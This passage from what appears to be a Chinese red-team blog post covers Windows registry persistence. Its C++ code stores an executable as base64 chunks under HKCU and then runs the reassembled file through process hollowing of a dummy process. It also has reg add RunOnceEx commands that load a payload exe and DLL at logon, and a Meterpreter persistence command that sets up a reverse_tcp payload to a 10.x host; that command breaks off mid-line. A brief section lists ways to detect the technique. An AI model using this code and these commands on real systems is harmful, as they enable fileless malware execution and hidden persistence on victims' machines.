class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">const</span> HKEY <span class="hljs-title">OpenRegistryKey</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> * <span class="hljs-type">const</span> strKeyName, <span class="hljs-type">const</span> <span class="hljs-type">bool</span> bCreate = <span class="hljs-literal">true</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>HKEY hKey = <span class="hljs-literal">nullptr</span>;<br>DWORD dwResult = <span class="hljs-number">0</span>;<br><br>LONG lRet = <span class="hljs-built_in">RegCreateKeyExA</span>(HKEY_CURRENT_USER, strKeyName, <span class="hljs-number">0</span>,<br>    <span class="hljs-literal">nullptr</span>, <span class="hljs-number">0</span>, KEY_READ | KEY_WRITE | KEY_CREATE_SUB_KEY,<br>    <span class="hljs-literal">nullptr</span>, &amp;hKey, &amp;dwResult);<br><br><span class="hljs-keyword">if</span> (lRet != ERROR_SUCCESS)<br>&#123;<br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Could not create/open registry key. Error = %X\n&quot;</span>,<br>        lRet);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (bCreate &amp;&amp; dwResult == REG_CREATED_NEW_KEY)<br>&#123;<br>    <span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">&quot;Created new registry key.\n&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">&quot;Opened existing registry key.\n&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">return</span> hKey;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">WriteRegistryKeyString</span><span class="hljs-params">(<span class="hljs-type">const</span> HKEY hKey, <span class="hljs-type">const</span> <span class="hljs-type">char</span> * <span class="hljs-type">const</span> strValueName,</span></span><br><span class="hljs-params"><span class="hljs-function"><span class="hljs-type">const</span> BYTE *pBytes, <span class="hljs-type">const</span> DWORD dwSize)</span></span><br><span class="hljs-function"></span>&#123;<br>std::string strEncodedData = <span class="hljs-built_in">base64_encode</span>(pBytes, dwSize);<br><br>LONG lRet = <span class="hljs-built_in">RegSetValueExA</span>(hKey, strValueName, <span class="hljs-number">0</span>, REG_SZ, (<span class="hljs-type">const</span> BYTE *)strEncodedData.<span class="hljs-built_in">c_str</span>(), strEncodedData.<span class="hljs-built_in">length</span>());<br><span class="hljs-keyword">if</span> (lRet != ERROR_SUCCESS)<br>&#123;<br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Could not write registry value. Error = %X\n&quot;</span>,<br>        lRet);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">const</span> std::array&lt;BYTE, READ_WRITE_SIZE&gt; <span class="hljs-title">ReadRegistryKeyString</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> * <span class="hljs-type">const</span> strKeyName,</span></span><br><span class="hljs-params"><span class="hljs-function"><span class="hljs-type">const</span> <span class="hljs-type">char</span> * <span class="hljs-type">const</span> strValueName, <span class="hljs-type">bool</span> &amp;bErrorOccured)</span></span><br><span class="hljs-function"></span>&#123;<br>DWORD dwType = <span class="hljs-number">0</span>;<br><span class="hljs-type">const</span> DWORD dwMaxReadSize = READ_WRITE_SIZE * <span class="hljs-number">2</span>;<br>DWORD dwReadSize = dwMaxReadSize;<br><br><span class="hljs-type">char</span> strBytesEncoded[READ_WRITE_SIZE * <span class="hljs-number">2</span>] = &#123; <span class="hljs-number">0</span> &#125;; <br>LONG lRet = <span class="hljs-built_in">RegGetValueA</span>(HKEY_CURRENT_USER, <br>strKeyName, strValueName,<br>    RRF_RT_REG_SZ, &amp;dwType, strBytesEncoded, &amp;dwReadSize);<br>std::array&lt;BYTE, READ_WRITE_SIZE&gt; pBytes = &#123; <span class="hljs-number">0</span> &#125;;<br>std::string strDecoded = <span class="hljs-built_in">base64_decode</span>(std::<span class="hljs-built_in">string</span>(strBytesEncoded));<br>(<span class="hljs-type">void</span>)<span class="hljs-built_in">memcpy</span>(pBytes.<span class="hljs-built_in">data</span>(), strDecoded.<span class="hljs-built_in">c_str</span>(), strDecoded.<span class="hljs-built_in">size</span>());<br><br><span class="hljs-keyword">if</span> (lRet != ERROR_SUCCESS)<br>&#123;<br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Could not read registry value. Error = %X\n&quot;</span>,<br>        lRet);<br>    bErrorOccured = <span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (dwType != REG_SZ || (dwReadSize == <span class="hljs-number">0</span> || dwReadSize &gt; dwMaxReadSize))<br>&#123;<br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Did not correctly read back a string from the registry.\n&quot;</span>);<br>    bErrorOccured = <span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-keyword">return</span> pBytes;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这基本是把文件导入到注册表的所有操作了。另外限于篇幅，还有一些额外的细节并没有在上述代码中展示出来，比如把文件分割成小部分写进不同的键值里，这部分代码如下：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">void <span class="hljs-constructor">WriteFileToRegistry(<span class="hljs-params">const</span> <span class="hljs-params">char</span> <span class="hljs-operator">*</span> <span class="hljs-params">const</span> <span class="hljs-params">pFilePath</span>)</span><br>&#123;<br>HKEY hKey = <span class="hljs-constructor">OpenRegistryKey(<span class="hljs-string">&quot;RegistryTest&quot;</span>)</span>; <br>std::<span class="hljs-built_in">string</span> strSubName = <span class="hljs-string">&quot;Part&quot;</span>;<br>std::<span class="hljs-built_in">string</span> strSizeName = <span class="hljs-string">&quot;Size&quot;</span>;<br>size_t ulIndex = <span class="hljs-number">1</span>;<br><br>auto splitFile = <span class="hljs-constructor">SplitFile(<span class="hljs-params">pFilePath</span>)</span>;<br><span class="hljs-keyword">for</span> (size_t i = <span class="hljs-number">0</span>; i &lt; splitFile.size<span class="hljs-literal">()</span>; ++i)<br>&#123;<br>    std::<span class="hljs-built_in">string</span> str<span class="hljs-constructor">FullName(<span class="hljs-params">strSubName</span> + <span class="hljs-params">std</span>::<span class="hljs-params">to_string</span>(<span class="hljs-params">ulIndex</span>)</span>);<br><br>    <span class="hljs-constructor">WriteRegistryKeyString(<span class="hljs-params">hKey</span>, <span class="hljs-params">strFullName</span>.<span class="hljs-params">c_str</span>()</span>, splitFile<span class="hljs-literal">[<span class="hljs-identifier">i</span>]</span>.data<span class="hljs-literal">()</span>, READ_WRITE_SIZE);<br>    ++ulIndex;<br>&#125;<br><span class="hljs-constructor">CloseHandle(<span class="hljs-params">hKey</span>)</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>示例代码中第一级键是在HKCU\RegistryTest下面，可执行文件被分割成多个块儿，每个块儿大小为2048字节，然后进行BASE64编码，以键值名“Part1”, “Part2”, … “PartN”的形式写入注册表里。执行上述代码后，</p><p>通过BASE64解码可以快速验证键值里面的内容是否正确，“Part1”键值内容被解码后输出如下内容（修剪过），可以看到PE文件头。</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs inform7">MZ<span class="hljs-comment">[144]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[3]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[4]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[255]</span><span class="hljs-comment">[255]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[184]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span>@<span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><br><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[240]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><br><span class="hljs-comment">[14]</span><span class="hljs-comment">[31]</span><span class="hljs-comment">[186]</span><span class="hljs-comment">[14]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[180]</span><span class="hljs-comment">[9]</span><span class="hljs-comment">[205]</span>!<span class="hljs-comment">[184]</span><span class="hljs-comment">[2]</span>L<span class="hljs-comment">[205]</span>!This program cannot be run in DOS mode.<span class="hljs-comment">[13]</span><span class="hljs-comment">[13]</span><br><span class="hljs-comment">[10]</span>$<span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[0]</span><span class="hljs-comment">[181]</span>!:<br><br></code></pre></td></tr></table></figure><p>这个时候文件已经被保存在注册表里了，同时可以从磁盘里删除了。</p><h3 id="0x01-从注册表中提取文件"><a href="#0x01-从注册表中提取文件" class="headerlink" title="0x01 从注册表中提取文件"></a>0x01 从注册表中提取文件</h3><hr><p>此时，文件被分割成多个小块并保存在注册表里。提取文件无非与第一节相反，读取存储文件的键值的每一部分、进行BASE64解码、合并文件。示例代码如下：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">NewProcessInfo <span class="hljs-constructor">JoinRegistryToFile(<span class="hljs-params">const</span> <span class="hljs-params">char</span> <span class="hljs-operator">*</span> <span class="hljs-params">const</span> <span class="hljs-params">strKeyName</span>, <span class="hljs-params">const</span> <span class="hljs-params">char</span> <span class="hljs-operator">*</span> <span class="hljs-params">const</span> <span class="hljs-params">strValueName</span>)</span><br>&#123;<br>NewProcessInfo newProcessInfo = &#123; <span class="hljs-number">0</span> &#125;;<br>std::vector&lt;std::<span class="hljs-built_in">array</span>&lt;BYTE, READ_WRITE_SIZE&gt;&gt; splitFile;<br><br>size_t ulKeyIndex = <span class="hljs-number">1</span>;<br>std::<span class="hljs-built_in">string</span> str<span class="hljs-constructor">FullName(<span class="hljs-params">strValueName</span> + <span class="hljs-params">std</span>::<span class="hljs-params">to_string</span>(<span class="hljs-params">ulKeyIndex</span>)</span>);<br><br><span class="hljs-built_in">bool</span> bErrorOccured = <span class="hljs-literal">false</span>;<br>auto partFile = <span class="hljs-constructor">ReadRegistryKeyString(<span class="hljs-params">strKeyName</span>, <span class="hljs-params">strFullName</span>.<span class="hljs-params">c_str</span>()</span>, bErrorOccured);<br><br><span class="hljs-keyword">while</span> (!bErrorOccured)<br>&#123;<br>    splitFile.push<span class="hljs-constructor">_back(<span class="hljs-params">partFile</span>)</span>;<br><br>    ++ulKeyIndex;<br>    strFullName = strValueName + std::<span class="hljs-keyword">to</span><span class="hljs-constructor">_string(<span class="hljs-params">ulKeyIndex</span>)</span>;<br><br>    partFile = <span class="hljs-constructor">ReadRegistryKeyString(<span class="hljs-params">strKeyName</span>, <span class="hljs-params">strFullName</span>.<span class="hljs-params">c_str</span>()</span>, bErrorOccured);<br>&#125;<br><br>newProcessInfo.pFileData = std::unique_ptr&lt;BYTE<span class="hljs-literal">[]</span>&gt;(<span class="hljs-keyword">new</span> BYTE<span class="hljs-literal">[<span class="hljs-identifier">splitFile</span>.<span class="hljs-identifier">size</span>() <span class="hljs-operator">*</span> READ<span class="hljs-identifier">_WRITE_SIZE</span>]</span>);<br>memset(newProcessInfo.pFileData.get<span class="hljs-literal">()</span>, <span class="hljs-number">0</span>, splitFile.size<span class="hljs-literal">()</span><span class="hljs-operator"> * </span>READ_WRITE_SIZE);<br><br>size_t ulWriteIndex = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (auto &amp;split : splitFile)<br>&#123;<br>    (void)memcpy(&amp;newProcessInfo.pFileData.get<span class="hljs-literal">()</span><span class="hljs-literal">[<span class="hljs-identifier">ulWriteIndex</span> <span class="hljs-operator">*</span> READ<span class="hljs-identifier">_WRITE_SIZE</span>]</span>, splitFile<span class="hljs-literal">[<span class="hljs-identifier">ulWriteIndex</span>]</span>.data<span class="hljs-literal">()</span>,<br>        READ_WRITE_SIZE);<br>    ++ulWriteIndex;<br>&#125;<br><br>newProcessInfo.pDosHeader = (IMAGE_DOS_HEADER *)&amp;(newProcessInfo.pFileData.get<span class="hljs-literal">()</span><span class="hljs-literal">[<span class="hljs-number">0</span>]</span>);<br>newProcessInfo.pNtHeaders = (IMAGE_NT_HEADERS *)&amp;(newProcessInfo.pFileData.get<span class="hljs-literal">()</span><span class="hljs-literal">[<span class="hljs-identifier">newProcessInfo</span>.<span class="hljs-identifier">pDosHeader</span>-&gt;<span class="hljs-identifier">e_lfanew</span>]</span>);<br><br> return newProcessInfo;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>这里上一节定义的<code>ReadRegistryKeyString</code>函数被用来提取文件的各个部分，然后把各个部分重新组、合并，存在<code>newProcessInfo.pFileData.</code>这个结构体里。这里还有些额外的区域需要被初始化，比如PE DOS and NT headers，这对下节将会非常有用。</p><p>加载提取后的文件 此时文件已经从注册表里提取出来了，并且保存在内存缓冲空间里。如果这时候我们把数据写进磁盘来启动进程，这就本末倒置了，因为文件又回到了磁盘里。这里我们采用替换进程（详见<a target="_blank" rel="noopener" href="http://www.codereversing.com/blog/archives/65">http://www.codereversing.com/blog/archives/65</a>）的方法来加载我们的可执行文件。接下来我们挂载一个僵尸进程（备注：随便打开一个进程），在它还没有映射内存的时候，使他处于暂停状态。然后我们把我们从注册表里提取的文件按字节映射到该进程里，然后再让进程继续运行，代码如下：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">void <span class="hljs-constructor">ExecuteFileFromRegistry(<span class="hljs-params">const</span> <span class="hljs-params">char</span> <span class="hljs-operator">*</span> <span class="hljs-params">const</span> <span class="hljs-params">pValueName</span>)</span><br>&#123;<br>HKEY hKey = <span class="hljs-constructor">OpenRegistryKey(<span class="hljs-string">&quot;RegistryTest&quot;</span>)</span>;<br><br>auto newProcessInfo = <span class="hljs-constructor">JoinRegistryToFile(<span class="hljs-string">&quot;RegistryTest&quot;</span>, <span class="hljs-params">pValueName</span>)</span>;<br>auto processInfo = <span class="hljs-constructor">MapTargetProcess(<span class="hljs-params">newProcessInfo</span>, <span class="hljs-string">&quot;DummyProcess.exe&quot;</span>)</span>;<br><span class="hljs-constructor">RunTargetProcess(<span class="hljs-params">newProcessInfo</span>, <span class="hljs-params">processInfo</span>)</span>;<br><br><span class="hljs-constructor">CloseHandle(<span class="hljs-params">hKey</span>)</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><code>MapTargetProcess and RunTargetProcess</code>这两个函数代码这里并没有贴出来，因为他们基本是我从我2011年写的文章里拷贝过来的。这里我提出一点需要注意的地方，本文描素的技术的适用条件是：傀儡进程以及我们需要执行的文件都是基于X86的，并且编译时要禁用<code>DEP/ASLR</code>。</p><p>这里<code>dummyprocess.exe</code>（包含在文章尾的ZIP里）的进程已被掏空，被另一个进程替换——<code>replacementprocess.exe</code>（也包括在zip）。ZIP里包有一个“Sample”文件夹，以提供交互实例。演示时按以下步骤操作：</p><p><strong>运行<code>dummyprocess.exe</code>观察那是一个Win32 UI的应用程序。</strong></p><p><strong>运行<code>write.bat</code>，他会调用<code>filelesslauncher.exe</code>把<code>replacementprocess.exe</code>写在<code>HKCU \\ registrytest</code>下。</strong></p><p><strong>删除<code>replacementprocess.exe</code>。</strong></p><p><strong>运行<code>execute.bat</code>，它将调用<code>filelesslauncher.exe</code>读取<code>HKCU \\ registrytest</code>下的内容并重组<code>replacementprocess.exe</code>。然后用<code>ReplacementProcess.exe</code>的数据来替<code>dummyprocess.exe</code>的内存数据。进程将继续运行，然后会弹出一个消息框弹，这是<code>replacementprocess.exe</code>代码被执行后的效果。</strong></p><p>最后请清理一下注册表。</p><h3 id="0x02-总结以及代码"><a href="#0x02-总结以及代码" class="headerlink" title="0x02 总结以及代码"></a>0x02 总结以及代码</h3><hr><p>本文所提供的技术展示了如何把一个可执行文件存储在注册表里。在对抗这种技术方面有很多选择。比如：某种程度上被写入的代码要被重组，这就意味着某个地方会出现恶意文件的硬编码或者从注册表提取文件的配置说明。这些都可以用来标记恶意软件的特征。另外，既然采用进程替换技术，也可以利用该技术的弱点来检测。比如，对比傀儡进程的内存镜像和磁盘镜像，一定会有很多不同。通过动态分析，也可以快速找出恶意软件：监控注册表API函数的调用以及检查是否调用了NtUnmapViewOfSection函数，来作为一个标记。</p><p>参考链接：代码更新 请关注Twitter:<a target="_blank" rel="noopener" href="https://twitter.com/codereversing">https://twitter.com/codereversing</a></p><h2 id="五：Powershell注册表操作和powershell操作注册表权限"><a href="#五：Powershell注册表操作和powershell操作注册表权限" class="headerlink" title="五：Powershell注册表操作和powershell操作注册表权限"></a>五：Powershell注册表操作和powershell操作注册表权限</h2><h3 id="0x00Powershell注册表操作"><a href="#0x00Powershell注册表操作" class="headerlink" title="0x00Powershell注册表操作"></a>0x00Powershell注册表操作</h3><p>#注册表操作命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">Get-PSProvider          获取安装的提供程序列表<br><br>Dir, Get-ChildItem  列出键的内容<br><br>Cd, Set-Location    更改当前（键）目录<br><br>HKCU:, HKLM:            预定义的两个重要注册表根目录虚拟驱动器<br><br>Get-ItemProperty    读取键的值<br><br>Set-ItemProperty    设置键的值<br><br>New-ItemProperty    给键创建一个新值<br><br>Clear-ItemProperty  删除键的值内容<br><br>Remove-ItemProperty     删除键的值<br><br>New-Item, md            创建一个新键<br><br>Remove-Item, Del    删除一个键<br><br>Test-Path           验证键是否存在<br><br>Get-PSDrive -PSProvider Registry    查看那些注册表驱动器已经被注册表提供程序使用<br><br>New-PSDrive job1 registry <span class="hljs-string">&quot;HKLM:\Software\Microsoft\Windows NT\CurrentVersion&quot;</span> <br><span class="hljs-built_in">dir</span> job1:                        自由地创建任何额外的驱动器<br><br></code></pre></td></tr></table></figure><h3 id="0x01powershell操作注册表权限"><a href="#0x01powershell操作注册表权限" class="headerlink" title="0x01powershell操作注册表权限"></a>0x01powershell操作注册表权限</h3><h1><a href="#" class="headerlink"></a></h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Get-Acl            <br><br></code></pre></td></tr></table></figure><p>查看键的当前权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$acl</span> = Get-Acl HKCU:\Software\Testkey<br><span class="hljs-variable">$acl</span>.Owner<br>mosser<br><span class="hljs-variable">$me</span> = [System.Security.Principal.NTAccount]<span class="hljs-string">&quot;<span class="hljs-variable">$env</span>:userdomain\$env:username&quot;</span><br><span class="hljs-variable">$acl</span>.SetOwner(<span class="hljs-variable">$me</span>)        <br><br></code></pre></td></tr></table></figure><p>接管一个注册表键（先有权限访问）的所有权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">del HKCU:\Software\Testkey2<br>md HKCU:\Software\Testkey2<br><span class="hljs-variable">$acl</span> = Get-Acl HKCU:\Software\Testkey2<br><span class="hljs-variable">$person</span> = [System.Security.Principal.NTAccount]<span class="hljs-string">&quot;Administrators&quot;</span><br><span class="hljs-variable">$access</span> = [System.Security.AccessControl.RegistryRights]<span class="hljs-string">&quot;FullControl&quot;</span><br><span class="hljs-variable">$inheritance</span> = [System.Security.AccessControl.InheritanceFlags]`<br><span class="hljs-string">&quot;ObjectInherit,ContainerInherit&quot;</span><br><span class="hljs-variable">$propagation</span> = [System.Security.AccessControl.PropagationFlags]<span class="hljs-string">&quot;None&quot;</span><br><span class="hljs-variable">$type</span> = [System.Security.AccessControl.AccessControlType]<span class="hljs-string">&quot;Allow&quot;</span><br><span class="hljs-variable">$rule</span> = New-Object System.Security.AccessControl.RegistryAccessRule( `<br><span class="hljs-variable">$person</span>,<span class="hljs-variable">$access</span>,<span class="hljs-variable">$inheritance</span>,<span class="hljs-variable">$propagation</span>,<span class="hljs-variable">$type</span>)<br><br><span class="hljs-variable">$acl</span>.ResetAccessRule(<span class="hljs-variable">$rule</span>) <br><span class="hljs-variable">$person</span> = [System.Security.Principal.NTAccount]<span class="hljs-string">&quot;Everyone&quot;</span><br><span class="hljs-variable">$access</span> = [System.Security.AccessControl.RegistryRights]<span class="hljs-string">&quot;ReadKey&quot;</span><br><span class="hljs-variable">$inheritance</span> = [System.Security.AccessControl.InheritanceFlags]`<br><span class="hljs-string">&quot;ObjectInherit,ContainerInherit&quot;</span><br><span class="hljs-variable">$propagation</span> = [System.Security.AccessControl.PropagationFlags]<span class="hljs-string">&quot;None&quot;</span><br><span class="hljs-variable">$type</span> = [System.Security.AccessControl.AccessControlType]<span class="hljs-string">&quot;Allow&quot;</span><br><span class="hljs-variable">$rule</span> = New-Object System.Security.AccessControl.RegistryAccessRule( `<br><span class="hljs-variable">$person</span>,<span class="hljs-variable">$access</span>,<span class="hljs-variable">$inheritance</span>,<span class="hljs-variable">$propagation</span>,<span class="hljs-variable">$type</span>)<br><span class="hljs-variable">$acl</span>.ResetAccessRule(<span class="hljs-variable">$rule</span>)<br>Set-Acl HKCU:\Software\Testkey2 <span class="hljs-variable">$acl</span><br><br></code></pre></td></tr></table></figure><p>管理员拥有更改权限普通用户只有读取的新键的权限</p><h3 id="六、各种工具配合注册表使用进行权限维持"><a href="#六、各种工具配合注册表使用进行权限维持" class="headerlink" title="六、各种工具配合注册表使用进行权限维持"></a>六、各种工具配合注册表使用进行权限维持</h3><p>Meterpreter –Run键</p><p>另外两个注册表位置，这些位置可以允许红队通过执行任意有效负载或DLL来实现持久性。这些将在登</p><p>录期间执行，并且需要管理员级别的特权。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">reg add<br><br><span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001&quot;</span> /v<br><br>Pentestlab /t REG_SZ /d <span class="hljs-string">&quot;C:\tmp\pentestlab.exe&quot;</span><br><br>reg add<br><br><span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Dep</span><br><span class="hljs-string"></span><br><span class="hljs-string">end&quot;</span> /v Pentestlab /t REG_SZ /d <span class="hljs-string">&quot;C:\tmp\pentestlab.dll&quot;</span><br></code></pre></td></tr></table></figure><p><img src="E:/typora%E5%9B%BE%E7%89%87/image-20211225145501769.png" srcset="/img/loading.gif" lazyload alt="image-20211225145501769"></p><p>Meterpreter –任意DLL</p><p><strong>Metasploit</strong></p><p>Metasploit Framework通过使用Meterpreter脚本和后期利用模块来支持通过注册表的持久性。</p><p>Meterpreter脚本将以VBS脚本的形式创建一个有效负载，该负载将被拖放到磁盘上，并将创建一个注</p><p>册表项，该注册表项将在用户登录期间运行该有效负载。</p><p>Metasploit – Meterpreter持久性脚本</p><p>用户下次登录系统时，将打开一个新的Meterpreter会话。</p><p>Metasploit – Meterpreter会话</p><p>另外，还有一个后期开发模块，可用于持久性。该模块需要以下配置，并将可执行文件放置在受感染系</p><p>统上的可写位置。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">run</span> persistence -U -P windows/x64/meterpreter/reverse_tcp -i <span class="hljs-number">5</span> -p <span class="hljs-number">443</span> -r<br><br><span class="hljs-attribute">10</span>.<span 